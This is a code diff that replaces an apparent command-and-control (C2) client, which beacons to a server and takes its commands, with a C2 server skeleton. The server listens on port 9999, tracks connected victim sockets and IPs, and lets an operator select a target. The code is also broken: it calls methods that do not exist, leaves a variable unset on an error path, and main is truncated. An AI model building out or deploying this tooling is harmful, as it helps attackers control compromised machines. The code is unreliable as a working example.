@@ -1,24 +1,58 @@
-import CONST
-import http.client
+from CONST import COMMANDS
+import signal
+import socket
+from queue import Queue
+import logging
 
-class Client:
+
+queue = Queue()
+
+class Server():
 
     def __init__(self):
-        pass
+        self.host = ''
+        self.port = 9999
+        self.socket = None
+        self.all_connections = []
+        self.all_ip_addresses = []
 
-    def keep_alive(self):
-        """
-        sends GET request to server every {interval} seconds
-        handles the command from c2 server if sent
-        """
+    def help(self):
+        for cmd, description in COMMANDS.items():
+            print(f'{cmd}:\t{description}')
+
+    def register_signal_handler(self):
+        signal.signal(signal.SIGINT, self.quit_gracefully)
+        signal.signal(signal.SIGTERM, self.quit_gracefully)
+
+
+    def handle_command(self):
         while True:
-            connection = http.client.HTTPConnection(CONST.SERVER_IP, CONST.SERVER_PORT)
-            connection.request("HEAD", "/")
-            response = connection.getresponse()
+            cmd = input('> ')
+            if cmd == 'clients':
+                self.show_clients()
+            elif 'client' in cmd:
+                try:
+                    client_id = int(cmd.split(' ')[-1])
+                except ValueError:
+                    print('Enter a valid index (integer)')
+                client_id, connection = self.get_target(client_id)
+
+    def show_clients(self):
+        print('ID\t-\tClient Addresses')
+        for i, client in enumerate(self.all_ip_addresses):
+            print(f'{i}\t-\t{client}')
+
+    def connect_to_target(self, id):
+        try:
+            connection = self.all_connections[id]
+        except IndexError:
+            print('Not a valid selection')
+            return None, None
+        print(f'Connected to {self.all_ip_addresses[id]}')
+        logging.info(f'Connected to {self.all_ip_addresses[id]}')
+        return id, connection
 
 def main():
-    c1 = Client()
-    c1.keep_alive()
-
-if __name__ == '__main__':
-    main()
+    logging.basicConfig(filename='Thor_logs.log',
+                        format='%(asctime)s [%(levelname)s] %(message)s',
+                        level=logging.INFO)
